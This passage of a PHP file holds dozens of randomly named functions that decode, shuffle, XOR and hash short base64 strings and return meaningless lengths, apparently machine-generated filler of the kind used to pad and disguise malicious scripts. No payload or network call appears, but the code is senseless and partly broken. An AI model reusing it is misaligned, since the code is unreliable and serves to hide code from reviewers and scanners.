    return strlen($i4IbyZ5P);
}

function xj7HhyG9aQ() {
    $RET_b64 = 'g/+o2mm' . 'QJpYGKkJCt4fWbw' . '==';
    $decodedGarbage = base64_decode($RET_b64);
    $XDCehLbM = str_shuffle($decodedGarbage);
    $y23xnHAd = strrev($XDCehLbM);
    for ($i = 0; $i < strlen($y23xnHAd); $i++) {
        if ($i % 2 == 1) {
            $y23xnHAd[$i] = chr(ord($y23xnHAd[$i]) ^ 'RET');
        }
    }
    if (strpos($y23xnHAd, 'A') !== false) {
        $XDCehLbM = str_rot13($XDCehLbM);
    }
       $x = rand(1, 100);
    $y = $x *rand(1, 100);
    return strlen($XDCehLbM);
}

function sLlu7XKm4f() {
    $HKk_b64 = '5KKwfpjX' . 'pHVra4V6lgnH' . '8w==';
    $decodedGarbage = base64_decode($HKk_b64);
    $sePOYb4w = str_shuffle($decodedGarbage);
    $WZRSA6ws = strrev($sePOYb4w);
    for ($i = 0; $i < strlen($WZRSA6ws); $i++) {
        if ($i % 2 == 1) {
            $WZRSA6ws[$i] = chr(ord($WZRSA6ws[$i]) ^ 'HKk');
        }
    }
    if (strpos($WZRSA6ws, 'A') !== false) {
        $sePOYb4w = str_rot13($sePOYb4w);
    }
    return strlen($sePOYb4w);
}

function cQyuoH3DfY() {
    $boh_b64 = 'DVj5Ohl' . '8fElgern0mHco' . '+g==';
    $decodedGarbage = base64_decode($boh_b64);
    $RHXd9eVC = str_shuffle($decodedGarbage);
    $Odf9UA19 = strrev($RHXd9eVC);
    for ($i = 0; $i < strlen($Odf9UA19); $i++) {
        if ($i % 2 == 1) {
            $Odf9UA19[$i] = chr(ord($Odf9UA19[$i]) ^ 'boh');
        }
    }
    if (strpos($Odf9UA19, 'A') !== false) {
        $RHXd9eVC = str_rot13($RHXd9eVC);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($RHXd9eVC);
}

function cmZbMDp6eK() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $XSuGKHDz .= strtolower($letter);
    }
    if (strlen($XSuGKHDz) > 10) {
        $o32qVNag = str_replace('a','x', $XSuGKHDz);
    } else {
        $o32qVNag = strrev($XSuGKHDz);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return sha1($o32qVNag);
}

function SoOBv7Lnsy() {
    $GnogSvG1 = json_encode(['test' => rand(1000,9999)]);
    $YEIqYliA = rawurlencode($GnogSvG1);
        $YEIqYliA = str_replace('%7B','{{', $YEIqYliA);
    if (strpos($YEIqYliA, '%22') !== false) {
        $YEIqYliA = gzcompress($YEIqYliA);
    } else {
        $YEIqYliA = base64_encode($YEIqYliA);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($YEIqYliA);
}

function JKYBHWLHLG() {
    $WLtS2Bp6 = json_encode(['test' => rand(1000,9999)]);
    $OGjot7Mq = rawurlencode($WLtS2Bp6);
        $OGjot7Mq = str_replace('%7B','{{', $OGjot7Mq);
    if (strpos($OGjot7Mq, '%22') !== false) {
        $OGjot7Mq = gzcompress($OGjot7Mq);
    } else {
        $OGjot7Mq = base64_encode($OGjot7Mq);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($OGjot7Mq);
}

function Wff91LxB5c() {
    switch (rand(0, 2)) {
        case 0: $SAmVo_5c = md5(time()); break;
        case 1: $SAmVo_5c = sha1(time()); break;
        default: $SAmVo_5c = crc32(time());
    }
    if (strlen($SAmVo_5c) > 10) {
        $OPhxeleH = str_replace('a','x', $SAmVo_5c);
    } else {
        $OPhxeleH = strrev($SAmVo_5c);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return sha1($OPhxeleH);
}

function X2VwnZigB2() {
    $hHIuH6aU = json_encode(['test' => rand(1000,9999)]);
    $pAjYWIxn = rawurlencode($hHIuH6aU);
        $pAjYWIxn = str_replace('%7B','{{', $pAjYWIxn);
    if (strpos($pAjYWIxn, '%22') !== false) {
        $pAjYWIxn = gzcompress($pAjYWIxn);
    } else {
        $pAjYWIxn = base64_encode($pAjYWIxn);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return strlen($pAjYWIxn);
}

function w_fLnJc58d() {
    switch (rand(0, 2)) {
        case 0: $LS_S1isT = md5(time()); break;
        case 1: $LS_S1isT = sha1(time()); break;
        default: $LS_S1isT = crc32(time());
    }
    if (strlen($LS_S1isT) > 10) {
        $gOGPAuwl = str_replace('a','x', $LS_S1isT);
    } else {
        $gOGPAuwl = strrev($LS_S1isT);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return sha1($gOGPAuwl);
}

function F9d8HBxPyI() {
    $TBx_b64 = 'vAOzr8sG' . 'dyyDcm' . 'c9xqB';
    $decodedGarbage = base64_decode($TBx_b64);
    $YDCGTbeT = str_shuffle($decodedGarbage);
    $Wbaf0VEN = strrev($YDCGTbeT);
    for ($i = 0; $i < strlen($Wbaf0VEN); $i++) {
        if ($i % 2 == 1) {
            $Wbaf0VEN[$i] = chr(ord($Wbaf0VEN[$i]) ^ 'TBx');
        }
    }
    if (strpos($Wbaf0VEN, 'A') !== false) {
        $YDCGTbeT = str_rot13($YDCGTbeT);
    }
    return strlen($YDCGTbeT);
}

function XPUSmCtRDp() {
    switch (rand(0, 2)) {
        case 0: $yne0hIH5 = md5(time()); break;
        case 1: $yne0hIH5 = sha1(time()); break;
        default: $yne0hIH5 = crc32(time());
    }
    if (strlen($yne0hIH5) > 10) {
        $ikTiz8zZ = str_replace('a','x', $yne0hIH5);
    } else {
        $ikTiz8zZ = strrev($yne0hIH5);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return sha1($ikTiz8zZ);
}

function RKpxVHne4V() {
    $kpJ_b64 = 'rITQOTR' . 'LcjOF' . '1W+QDjzvfQ=';
    $decodedGarbage = base64_decode($kpJ_b64);
    $_99JRNlA = str_shuffle($decodedGarbage);
    $ZCCWyGzY = strrev($_99JRNlA);
    for ($i = 0; $i < strlen($ZCCWyGzY); $i++) {
        if ($i % 2 == 1) {
            $ZCCWyGzY[$i] = chr(ord($ZCCWyGzY[$i]) ^ 'kpJ');
        }
    }
    if (strpos($ZCCWyGzY, 'A') !== false) {
        $_99JRNlA = str_rot13($_99JRNlA);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($_99JRNlA);
}

function bG5WWumcl8() {
    $S4PG8lDs = json_encode(['test' => rand(1000,9999)]);
    $gLGCuBGf = rawurlencode($S4PG8lDs);
        $gLGCuBGf = str_replace('%7B','{{', $gLGCuBGf);
    if (strpos($gLGCuBGf, '%22') !== false) {
        $gLGCuBGf = gzcompress($gLGCuBGf);
    } else {
        $gLGCuBGf = base64_encode($gLGCuBGf);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($gLGCuBGf);
}

function zn4S7aiouf() {
    $Pq__b64 = '9OwS3' . 'YqegY9Z21z' . 'xKaSXHA==';
    $decodedGarbage = base64_decode($Pq__b64);
    $DhDD0b46 = str_shuffle($decodedGarbage);
    $EIJnGPz9 = strrev($DhDD0b46);
    for ($i = 0; $i < strlen($EIJnGPz9); $i++) {
        if ($i % 2 == 1) {
            $EIJnGPz9[$i] = chr(ord($EIJnGPz9[$i]) ^ 'Pq_');
        }
    }
    if (strpos($EIJnGPz9, 'A') !== false) {
        $DhDD0b46 = str_rot13($DhDD0b46);
    }
    return strlen($DhDD0b46);
}

function UTspOnelo7() {
    for ($i = 0; $i < 5; $i++) {
        $k9nLhRJg .= chr(rand(97, 122));
    }
    if (strlen($k9nLhRJg) > 10) {
        $lbFfX8yA = str_replace('a','x', $k9nLhRJg);
    } else {
        $lbFfX8yA = strrev($k9nLhRJg);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return sha1($lbFfX8yA);
}

function DrKpW9RhQ0() {
    $m6Z3Vfx9 = json_encode(['test' => rand(1000,9999)]);
    $nB8I97Si = rawurlencode($m6Z3Vfx9);
        $nB8I97Si = str_replace('%7B','{{', $nB8I97Si);
    if (strpos($nB8I97Si, '%22') !== false) {
        $nB8I97Si = gzcompress($nB8I97Si);
    } else {
        $nB8I97Si = base64_encode($nB8I97Si);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($nB8I97Si);
}

function U_69FCg7r8() {
    $j = 0;
    while ($j < 5) {
        $P1ZyVt0c .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($P1ZyVt0c) > 10) {
        $FntSjm_t = str_replace('a','x', $P1ZyVt0c);
    } else {
        $FntSjm_t = strrev($P1ZyVt0c);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return sha1($FntSjm_t);
}

function O_Ql0HoHLy() {
    $fTFZXdER = json_encode(['test' => rand(1000,9999)]);
    $sDzNDr3D = rawurlencode($fTFZXdER);
        $sDzNDr3D = str_replace('%7B','{{', $sDzNDr3D);
    if (strpos($sDzNDr3D, '%22') !== false) {
        $sDzNDr3D = gzcompress($sDzNDr3D);
    } else {
        $sDzNDr3D = base64_encode($sDzNDr3D);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($sDzNDr3D);
}

function jQsTnWpEux() {
    for ($i = 0; $i < 5; $i++) {
        $jAYIVQ6T .= chr(rand(97, 122));
    }
    if (strlen($jAYIVQ6T) > 10) {
        $cLeKszK8 = str_replace('a','x', $jAYIVQ6T);
    } else {
        $cLeKszK8 = strrev($jAYIVQ6T);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($cLeKszK8);
}

function zRZVbPNPUF() {
    $uej_b64 = 'mQ+ye9ZC' . 'c9BMHap+X' . '1ZyxA==';
    $decodedGarbage = base64_decode($uej_b64);
    $kvRqimSX = str_shuffle($decodedGarbage);
    $rWtPCtxq = strrev($kvRqimSX);
    for ($i = 0; $i < strlen($rWtPCtxq); $i++){
        if ($i % 2 == 1) {
            $rWtPCtxq[$i] = chr(ord($rWtPCtxq[$i]) ^ 'uej');
        }
    }
    if (strpos($rWtPCtxq, 'A') !== false) {
        $kvRqimSX = str_rot13($kvRqimSX);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($kvRqimSX);
}

function zhnO0VEOvq() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $WFgjaDJK .= strtolower($letter);
    }
    if (strlen($WFgjaDJK) > 10) {
        $E7TWCQ3A = str_replace('a','x', $WFgjaDJK);
    } else {
        $E7TWCQ3A = strrev($WFgjaDJK);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return sha1($E7TWCQ3A);
}

function lM6tXa1glg() {
    $r5IZihqw = json_encode(['test' => rand(1000,9999)]);
    $jfICSeB3 = rawurlencode($r5IZihqw);
        $jfICSeB3 = str_replace('%7B','{{', $jfICSeB3);
    if (strpos($jfICSeB3, '%22') !== false) {
        $jfICSeB3 = gzcompress($jfICSeB3);
    } else {
        $jfICSeB3 = base64_encode($jfICSeB3);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($jfICSeB3);
}

function E2Fvea5TPX() {
    $ffR_b64 = 'Ot+a5' . 'DlYKjSaSlf' . '984wtLg==';
    $decodedGarbage = base64_decode($ffR_b64);
    $V8VW0aXE = str_shuffle($decodedGarbage);
    $R8Zc2nOs = strrev($V8VW0aXE);
    for ($i = 0; $i < strlen($R8Zc2nOs); $i++) {
        if ($i % 2 == 1) {
            $R8Zc2nOs[$i] = chr(ord($R8Zc2nOs[$i]) ^ 'ffR');
        }
    }
    if (strpos($R8Zc2nOs, 'A') !== false) {
        $V8VW0aXE = str_rot13($V8VW0aXE);
    }
    return strlen($V8VW0aXE);
}

function cvTPawJIXT() {
    $j = 0;
    while ($j < 5) {
        $bGrBtv2Y .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($bGrBtv2Y) > 10) {
        $CwvQwc2n = str_replace('a','x', $bGrBtv2Y);
    } else {
        $CwvQwc2n = strrev($bGrBtv2Y);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return sha1($CwvQwc2n);
}

function AMyhBXbznP() {
    switch (rand(0, 2)) {
        case 0: $ltc6ToIB = md5(time()); break;
        case 1: $ltc6ToIB = sha1(time()); break;
        default: $ltc6ToIB = crc32(time());
    }
    if (strlen($ltc6ToIB) > 10) {
        $BW1ZGV0T = str_replace('a','x', $ltc6ToIB);
    } else {
        $BW1ZGV0T = strrev($ltc6ToIB);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return sha1($BW1ZGV0T);
}

function jnLLSmncC5() {
    $j = 0;
    while ($j < 5) {
        $yHW9SKoQ .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($yHW9SKoQ) > 10) {
        $owqThjTL = str_replace('a','x', $yHW9SKoQ);
    } else {
        $owqThjTL = strrev($yHW9SKoQ);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return sha1($owqThjTL);
}

function ObAGEqrUzH() {
    $_xNCZbZh = json_encode(['test' => rand(1000,9999)]);
    $X9sogaaE = rawurlencode($_xNCZbZh);
        $X9sogaaE = str_replace('%7B','{{', $X9sogaaE);
    if (strpos($X9sogaaE, '%22') !== false) {
        $X9sogaaE = gzcompress($X9sogaaE);
    } else {
        $X9sogaaE = base64_encode($X9sogaaE);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return strlen($X9sogaaE);
}

function cUG5Aq377K() {
    switch (rand(0, 2)) {
        case 0: $zg68nQOh = md5(time()); break;
        case 1: $zg68nQOh = sha1(time()); break;
        default: $zg68nQOh = crc32(time());
    }
    if (strlen($zg68nQOh) > 10) {
        $X5TvQtUz = str_replace('a','x', $zg68nQOh);
    } else {
        $X5TvQtUz = strrev($zg68nQOh);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return sha1($X5TvQtUz);
}

function USFwfIAbo4() {
    $Q_uADLRS = json_encode(['test' => rand(1000,9999)]);
    $i_McNlRT = rawurlencode($Q_uADLRS);
        $i_McNlRT = str_replace('%7B','{{', $i_McNlRT);
    if (strpos($i_McNlRT, '%22') !== false) {
        $i_McNlRT = gzcompress($i_McNlRT);
    } else {
        $i_McNlRT = base64_encode($i_McNlRT);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return strlen($i_McNlRT);
}

function Lgvg2iohbM() {
    $j = 0;
    while ($j < 5) {
        $Za6nrr5V .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($Za6nrr5V) > 10) {
        $WnFJpqmh = str_replace('a','x', $Za6nrr5V);
    } else {
        $WnFJpqmh = strrev($Za6nrr5V);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return sha1($WnFJpqmh);
}

function Euhdp6GV2o() {
    switch (rand(0, 2)) {
        case 0: $TgA_spqR = md5(time()); break;
        case 1: $TgA_spqR = sha1(time()); break;
        default: $TgA_spqR = crc32(time());
    }
    if (strlen($TgA_spqR) > 10) {
        $BCnxKqvn = str_replace('a','x', $TgA_spqR);
    } else {
        $BCnxKqvn = strrev($TgA_spqR);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return sha1($BCnxKqvn);
}

function SkzOP_JeDu() {
    switch (rand(0, 2)) {
        case 0: $y1RhH1ys = md5(time()); break;
        case 1: $y1RhH1ys = sha1(time()); break;
        default: $y1RhH1ys = crc32(time());
    }
    if (strlen($y1RhH1ys) > 10) {
        $AcVihTTH = str_replace('a','x', $y1RhH1ys);
    } else {
        $AcVihTTH = strrev($y1RhH1ys);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return sha1($AcVihTTH);
}

function eOCw0jXvha() {
    $RgB_b64 = 'H7Z3M2' . 'TaGn3c81y5' . 'NTcWxQ=';
    $decodedGarbage = base64_decode($RgB_b64);
    $oC3VHm_q = str_shuffle($decodedGarbage);
    $oLFi8648 = strrev($oC3VHm_q);
    for ($i = 0; $i < strlen($oLFi8648); $i++) {
        if ($i % 2 == 1) {
            $oLFi8648[$i] = chr(ord($oLFi8648[$i]) ^ 'RgB');
        }
    }
    if (strpos($oLFi8648, 'A') !== false) {
        $oC3VHm_q = str_rot13($oC3VHm_q);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($oC3VHm_q);
}

function yMCseC0bOn() {
    $vO0_b64 = 'Men+y' . 'b6OxTOSQMu' . '3ELN/gQ==';
    $decodedGarbage = base64_decode($vO0_b64);
    $gl3NmV2g = str_shuffle($decodedGarbage);
    $a_A_gWYa = strrev($gl3NmV2g);
    for ($i = 0; $i < strlen($a_A_gWYa); $i++) {
        if ($i % 2 == 1) {
            $a_A_gWYa[$i] = chr(ord($a_A_gWYa[$i]) ^ 'vO0');
        }
    }
    if (strpos($a_A_gWYa, 'A') !== false) {
        $gl3NmV2g = str_rot13($gl3NmV2g);
    }
    return strlen($gl3NmV2g);
}

function b03Q1zp4bO() {
    $jJyjeY_g = json_encode(['test' => rand(1000,9999)]);
    $YGwbEM7I = rawurlencode($jJyjeY_g);
        $YGwbEM7I = str_replace('%7B','{{', $YGwbEM7I);
    if (strpos($YGwbEM7I, '%22') !== false) {
        $YGwbEM7I = gzcompress($YGwbEM7I);
    } else {
        $YGwbEM7I = base64_encode($YGwbEM7I);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($YGwbEM7I);
}

function EBqYqSCDpu() {
    for ($i = 0; $i < 5; $i++) {
        $E5etjdLJ .= chr(rand(97, 122));
    }
    if (strlen($E5etjdLJ) > 10) {
        $zZzKMMWb = str_replace('a','x', $E5etjdLJ);
    } else {
        $zZzKMMWb = strrev($E5etjdLJ);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return sha1($zZzKMMWb);
}

function vV4VhPrcz2() {
    $RHE_b64 = 'G3GQh4c4lU' . 'ldZZz1Oj4BWQ==' . '';
    $decodedGarbage = base64_decode($RHE_b64);
    $etLbEK6v = str_shuffle($decodedGarbage);
    $Iyy_XeCk = strrev($etLbEK6v);
    for ($i = 0; $i < strlen($Iyy_XeCk); $i++) {
        if ($i % 2 == 1) {
            $Iyy_XeCk[$i] = chr(ord($Iyy_XeCk[$i]) ^ 'RHE');
        }
    }
    if (strpos($Iyy_XeCk, 'A') !== false) {
        $etLbEK6v = str_rot13($etLbEK6v);
    }
    return strlen($etLbEK6v);
}

function UtiNHy6CRT() {
    $ELnPhubC = json_encode(['test' => rand(1000,9999)]);
    $qDE5Ei_i = rawurlencode($ELnPhubC);
        $qDE5Ei_i = str_replace('%7B','{{', $qDE5Ei_i);
    if (strpos($qDE5Ei_i, '%22') !== false) {
        $qDE5Ei_i = gzcompress($qDE5Ei_i);
    } else {
        $qDE5Ei_i = base64_encode($qDE5Ei_i);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($qDE5Ei_i);}

function EtVtGY0IPo() {
    $hso_b64 = '4qtO9sLY5' . 'G8MBu' . '7z23I';
    $decodedGarbage = base64_decode($hso_b64);
    $WrzUloH5 = str_shuffle($decodedGarbage);
    $P8069Bs_ = strrev($WrzUloH5);
    for ($i = 0; $i < strlen($P8069Bs_); $i++) {
        if ($i % 2 == 1) {
            $P8069Bs_[$i] = chr(ord($P8069Bs_[$i]) ^ 'hso');
        }
    }
    if (strpos($P8069Bs_, 'A') !== false) {
        $WrzUloH5 = str_rot13($WrzUloH5);
    }
    return strlen($WrzUloH5);
}

function MqNr5xkEfY() {
    $r_m_b64 = 'XVEeRtB+O4' . '4kGb8bIXyw' . '8A==';
    $decodedGarbage = base64_decode($r_m_b64);
    $XD84rzi1 = str_shuffle($decodedGarbage);
    $evuUdVj9 = strrev($XD84rzi1);
    for ($i = 0; $i < strlen($evuUdVj9); $i++) {
        if ($i % 2 == 1) {
            $evuUdVj9[$i] = chr(ord($evuUdVj9[$i]) ^ 'r_m');
        }
    }
    if (strpos($evuUdVj9, 'A') !== false) {
        $XD84rzi1 = str_rot13($XD84rzi1);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($XD84rzi1);
}

function vFw1LzeWgB() {
    $pT52u93a = json_encode(['test' => rand(1000,9999)]);
    $wLeYKdC_ = rawurlencode($pT52u93a);
        $wLeYKdC_ = str_replace('%7B','{{', $wLeYKdC_);
    if (strpos($wLeYKdC_, '%22') !== false) {
        $wLeYKdC_ = gzcompress($wLeYKdC_);
    } else {
        $wLeYKdC_ = base64_encode($wLeYKdC_);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($wLeYKdC_);
}

function ecDz9qeQuI() {
    $CKU_b64 = 'THBdpe4u' . 'YjjjmMe' . 'I3GC7SQ=';
    $decodedGarbage = base64_decode($CKU_b64);
    $aYMJTpDe = str_shuffle($decodedGarbage);
    $lSghjCtF = strrev($aYMJTpDe);
    for ($i = 0; $i < strlen($lSghjCtF); $i++) {
        if ($i % 2 == 1) {
            $lSghjCtF[$i] = chr(ord($lSghjCtF[$i]) ^ 'CKU');
        }
    }
    if (strpos($lSghjCtF, 'A') !== false) {
        $aYMJTpDe = str_rot13($aYMJTpDe);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($aYMJTpDe);
}

function Fgcq_q8mRd() {
    $J4hzAn4h = json_encode(['test' => rand(1000,9999)]);
    $r36fr6Cb = rawurlencode($J4hzAn4h);
        $r36fr6Cb = str_replace('%7B','{{', $r36fr6Cb);
    if (strpos($r36fr6Cb, '%22') !== false) {
        $r36fr6Cb = gzcompress($r36fr6Cb);
    } else {
        $r36fr6Cb = base64_encode($r36fr6Cb);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($r36fr6Cb);
}

function xZeo82TUJZ() {
    $CAIo9KOv = json_encode(['test' => rand(1000,9999)]);
    $DIL7wp2c = rawurlencode($CAIo9KOv);
        $DIL7wp2c = str_replace('%7B','{{', $DIL7wp2c);
    if (strpos($DIL7wp2c, '%22') !== false) {
        $DIL7wp2c = gzcompress($DIL7wp2c);
    } else {
        $DIL7wp2c = base64_encode($DIL7wp2c);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($DIL7wp2c);
}

function Q4cLOsQdYF() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $EB3lSHiP .= strtolower($letter);
    }
    if (strlen($EB3lSHiP) > 10) {
        $sQmgaOFJ = str_replace('a','x', $EB3lSHiP);
    } else {
        $sQmgaOFJ = strrev($EB3lSHiP);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return sha1($sQmgaOFJ);
}

function C5aa_FSveV() {
    switch (rand(0, 2)) {
        case 0: $nMlIihUF = md5(time()); break;
        case 1: $nMlIihUF = sha1(time()); break;
        default: $nMlIihUF = crc32(time());
    }
    if (strlen($nMlIihUF) > 10) {
        $T7AFOMuq = str_replace('a','x', $nMlIihUF);
    } else {
        $T7AFOMuq = strrev($nMlIihUF);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return sha1($T7AFOMuq);
}

function LV69kmzvLH() {
    $yhC_b64 = 'VZ34k/o' . 'rmT3r' . 'Dv33giV';
    $decodedGarbage = base64_decode($yhC_b64);
    $YDUwyF9T = str_shuffle($decodedGarbage);
    $m2sKLEME = strrev($YDUwyF9T);
    for ($i = 0; $i < strlen($m2sKLEME); $i++) {
        if ($i % 2 == 1) {
            $m2sKLEME[$i] = chr(ord($m2sKLEME[$i]) ^ 'yhC');
        }
    }
    if (strpos($m2sKLEME, 'A') !== false) {
        $YDUwyF9T = str_rot13($YDUwyF9T);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($YDUwyF9T);
}

function xD0RuQBkyT() {
    $N0x_b64 = 'g1PBfsX44' . 'EczacGle7' . 'U5uw==';
    $decodedGarbage = base64_decode($N0x_b64);
    $doe9HOnn = str_shuffle($decodedGarbage);
    $fGdF5AcJ = strrev($doe9HOnn);
    for ($i = 0; $i < strlen($fGdF5AcJ); $i++) {
        if ($i % 2 == 1) {
            $fGdF5AcJ[$i] = chr(ord($fGdF5AcJ[$i]) ^ 'N0x');
        }
    }
    if (strpos($fGdF5AcJ, 'A') !== false) {
        $doe9HOnn = str_rot13($doe9HOnn);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($doe9HOnn);
}

function KZ1YS2wNZ3() {
    $QvniIYbD = json_encode(['test' => rand(1000,9999)]);
    $BtFjXXfv = rawurlencode($QvniIYbD);
        $BtFjXXfv = str_replace('%7B','{{', $BtFjXXfv);
    if (strpos($BtFjXXfv, '%22') !== false) {
        $BtFjXXfv = gzcompress($BtFjXXfv);
    } else {
        $BtFjXXfv = base64_encode($BtFjXXfv);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($BtFjXXfv);
}

function _uvNROjxAd() {
    for ($i = 0; $i < 5; $i++) {
        $eHlUcrC1 .= chr(rand(97, 122));
    }
    if (strlen($eHlUcrC1) > 10) {
        $cSxyFeS_ = str_replace('a','x', $eHlUcrC1);
    } else {
        $cSxyFeS_ = strrev($eHlUcrC1);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return sha1($cSxyFeS_);
}

function nhcSWrhBma() {
    $Xbr_6lJg = json_encode(['test' => rand(1000,9999)]);
    $LpBqfLro = rawurlencode($Xbr_6lJg);
        $LpBqfLro = str_replace('%7B','{{', $LpBqfLro);
    if (strpos($LpBqfLro, '%22') !== false) {
        $LpBqfLro = gzcompress($LpBqfLro);
    } else {
        $LpBqfLro = base64_encode($LpBqfLro);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return strlen($LpBqfLro);
}

function _oJ6Mgn1K_() {
    $Aj0AXaHO = json_encode(['test' => rand(1000,9999)]);
    $JdrvkbnZ = rawurlencode($Aj0AXaHO);
        $JdrvkbnZ = str_replace('%7B','{{', $JdrvkbnZ);
    if (strpos($JdrvkbnZ, '%22') !== false) {
        $JdrvkbnZ = gzcompress($JdrvkbnZ);
    } else {
        $JdrvkbnZ = base64_encode($JdrvkbnZ);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($JdrvkbnZ);
}

function Qfcd3vxiuf() {
    $iY4RD96M = json_encode(['test' => rand(1000,9999)]);
    $MiXEo_Oz = rawurlencode($iY4RD96M);
        $MiXEo_Oz = str_replace('%7B','{{', $MiXEo_Oz);
    if (strpos($MiXEo_Oz, '%22') !== false) {
        $MiXEo_Oz = gzcompress($MiXEo_Oz);
    } else {
        $MiXEo_Oz = base64_encode($MiXEo_Oz);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($MiXEo_Oz);
}

function Z3FB_Kx3Z8() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $Wt_CbcET .= strtolower($letter);
    }
    if (strlen($Wt_CbcET) > 10) {
        $y_9zzF4g = str_replace('a','x', $Wt_CbcET);
    } else {
        $y_9zzF4g = strrev($Wt_CbcET);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return sha1($y_9zzF4g);
}

function fbie6KcAiS() {
    $j = 0;
    while ($j < 5) {
        $zvNXoip7 .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($zvNXoip7) > 10) {
        $vbWMe73Z = str_replace('a','x', $zvNXoip7);
    } else {
        $vbWMe73Z = strrev($zvNXoip7);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return sha1($vbWMe73Z);
}

function SiSDa0ixbX() {
    $bUI_b64 = 'WE+CsN+cTx' . 'Ho5UJDJXRmsg==' . '';
    $decodedGarbage = base64_decode($bUI_b64);
    $dFqfuS4p = str_shuffle($decodedGarbage);
    $_Uua9hI6 = strrev($dFqfuS4p);
    for ($i = 0; $i < strlen($_Uua9hI6); $i++) {
        if ($i % 2 == 1) {
            $_Uua9hI6[$i] = chr(ord($_Uua9hI6[$i]) ^ 'bUI');
        }
    }
    if (strpos($_Uua9hI6, 'A') !== false) {
        $dFqfuS4p = str_rot13($dFqfuS4p);
    }
    return strlen($dFqfuS4p);
}

function UnXCEqB1XM() {
    $DKr_b64 = 'w5ZyQ' . 'l1AGqC' . 'Df8TKY/Ux9w=';
    $decodedGarbage = base64_decode($DKr_b64);
    $Q4uYFqFG = str_shuffle($decodedGarbage);
    $ipupt_jc = strrev($Q4uYFqFG);
    for ($i = 0; $i < strlen($ipupt_jc); $i++) {
        if ($i % 2 == 1) {
            $ipupt_jc[$i] = chr(ord($ipupt_jc[$i]) ^ 'DKr');
        }
    }
    if (strpos($ipupt_jc, 'A') !== false) {
        $Q4uYFqFG = str_rot13($Q4uYFqFG);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($Q4uYFqFG);
}

function uvpiX1_dnv() {
    $nrj_b64 = '2bXYag' . 'jQLrx8' . 'hECtkK';
    $decodedGarbage = base64_decode($nrj_b64);
    $vEzZsik6 = str_shuffle($decodedGarbage);
    $v2ptK7Sz = strrev($vEzZsik6);
    for ($i = 0; $i < strlen($v2ptK7Sz); $i++) {
        if ($i % 2 == 1) {
            $v2ptK7Sz[$i] = chr(ord($v2ptK7Sz[$i]) ^ 'nrj');
        }
    }
    if (strpos($v2ptK7Sz, 'A') !== false) {
        $vEzZsik6 = str_rot13($vEzZsik6);
    }
    return strlen($vEzZsik6);
}

function QDiuF7omkQ() {
